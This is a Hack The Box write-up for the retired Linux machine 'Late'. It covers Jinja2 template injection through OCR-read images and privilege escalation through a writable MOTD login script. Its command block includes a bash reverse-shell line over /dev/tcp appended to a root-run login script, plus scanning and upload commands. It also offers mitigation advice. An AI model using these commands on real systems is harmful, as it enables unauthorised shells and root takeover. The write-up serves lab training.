---
machine: Late
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, ssti, jinja2, ocr, login-script]
---

# Late — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

An OCR site renders recognized text with Jinja2 and is vulnerable to SSTI. An image with a well-formatted expression returns execution. Escalation abuses write permission to append a line to a login script and triggers it over SSH.

## Reconnaissance

```bash
nmap -Pn -sCV -p22,80 <IP>
ffuf -u http://late.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
# Image with Jinja2 text
convert -size 800x200 xc:white -pointsize 40 -annotate +20+100 '{{7*7}}' test.png
curl -F "image=@test.png" http://late.htb/upload
# SSTI
curl -F "image=@payload.png" http://late.htb/upload
# Login script
ls -la /etc/update-motd.d/
echo 'bash -i >& /dev/tcp/<IP>/4444 0>&1' >> /etc/update-motd.d/00-header
ssh <USER>@<IP>
```

## Enumeration

- OCR site accepting images and displaying text.
- Jinja2 rendering of unescaped text.
- Login script writable by the user.

## Initial access

Upload an image containing a Jinja2 expression readable by OCR. The server renders it and runs the payload, returning a shell as the application user.

## Privilege escalation

Review login or MOTD scripts and check whether the user can append lines. Add a command that starts a shell and open a new SSH session so the script runs as root.

## Evidence

- Image with `{{7*7}}` rendered as `49`.
- SSTI payload with shell callback.
- Line appended to the login script and root shell.

## Lessons learned

- OCR is not a trust boundary for templates.
- A writable login script is persistence and escalation.
- Group permissions can allow append without edit.

## Mitigation and detection

- Render text as data, not as a template.
- Mount login scripts read-only.
- Audit group permissions on `/etc` and MOTD.

## References

- [0xdf — Late](https://0xdf.gitlab.io/2022/07/30/htb-late.html)
- [Jinja2 — Template Designer](https://jinja.palletsprojects.com/en/stable/templates/)
- [Hack The Box — Late](https://app.hackthebox.com/machines/late)
